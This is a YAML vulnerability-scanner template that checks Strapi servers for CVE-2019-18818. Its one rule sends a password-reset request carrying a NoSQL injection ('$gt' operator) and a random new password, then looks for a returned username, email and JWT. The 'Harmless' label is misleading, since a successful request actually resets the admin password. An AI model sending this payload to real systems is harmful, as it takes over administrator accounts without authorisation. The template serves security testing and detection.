name: yaml-poc-strapi-strapi-unauthorized_access-CVE-2019-18818
binding: 2289d189-e70c-4f98-89e2-453d7f4a28bc
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/163939/Strapi-3.0.0-beta-Authentication-Bypass.html
        - http://packetstormsecurity.com/files/163950/Strapi-CMS-3.0.0-beta.17.4-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/165896/Strapi-CMS-3.0.0-beta.17.4-Privilege-Escalation.html
        - https://cxsecurity.com/issue/WLB-2022020040
        - https://github.com/strapi/strapi/pull/4443
        - https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17.5
        - https://nvd.nist.gov/vuln/detail/CVE-2019-18818
        - https://packetstormsecurity.com/files/163939/Strapi-3.0.0-beta-Authentication-Bypass.html
        - https://packetstormsecurity.com/files/163950/Strapi-CMS-3.0.0-beta.17.4-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/165896/Strapi-CMS-3.0.0-beta.17.4-Privilege-Escalation.html
        - https://www.exploit-db.com/exploits/50237
        - https://www.exploit-db.com/exploits/50716
        - https://www.npmjs.com/advisories/1311
    vulnerability:
        id: fbde0779-c9b6-48cd-8a18-c5e7eaadfbc7
        level: critical
    warning: Harmless
transport: http
set:
    BaseURL: request.url.domain
    SpassWord: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /admin/auth/reset-password
            headers:
                Content-Type: application/json
                Origin: https://{{BaseURL}}
            body: '{"code": {"$gt": 0}, "password": "{{SpassWord}}", "passwordConfirmation": "{{SpassWord}}"}'
            follow_redirects: false
        expression: response.status == 200 && response.raw_header.bcontains(b"application/json") && response.body_string.contains('"username":') && response.body_string.contains('"email":') && response.body_string.contains('"jwt":')
expression: r0()
